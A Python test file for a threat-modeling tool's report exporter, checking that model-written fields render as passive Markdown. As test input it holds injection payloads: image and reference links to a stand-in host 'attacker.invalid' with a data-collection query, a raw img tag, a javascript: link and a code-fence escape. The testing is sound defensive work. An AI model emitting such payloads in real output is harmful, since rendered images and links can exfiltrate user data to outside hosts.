"""Passive Markdown is required at the final export boundary, not just cells."""

from markdown_it import MarkdownIt

from stride_gpt.agent.report import render_json, render_markdown, render_markdown_from_json


def test_all_model_fields_stay_passive_in_live_and_saved_exports(sample_report):
    payload = (
        '![diagram](https://attacker.invalid/collect?data=FAKE_SOURCE)\n\n'
        '![reference image][leak]\n\n'
        '[leak]: https://attacker.invalid/leak\n\n'
        '<img src="https://attacker.invalid/html">\n\n'
        '[unsafe](javascript:alert(1))'
    )
    sample_report.plan.overall_description = payload
    finding = sample_report.findings[0]
    finding.subsystem = payload
    finding.improvement_suggestions = [payload]
    finding.files_analyzed = ['x` ![file](https://attacker.invalid/file) `']
    finding.threats[0]['Scenario'] = payload
    sample_report.data_flow_diagram = (
        'flowchart TD\nA-->B\n```\n![fence escape](https://attacker.invalid/fence)\n```'
    )
    parser = MarkdownIt('commonmark', {'html': True}).enable('table')
    for markdown in (render_markdown(sample_report), render_markdown_from_json(render_json(sample_report))):
        html = parser.render(markdown)
        assert '<img ' not in html
        assert '<a ' not in html
        assert '<script' not in html
        assert '<h1>' in html
        assert '<table>' in html
        assert 'Total threats identified' in html
        assert 'flowchart TD' in html
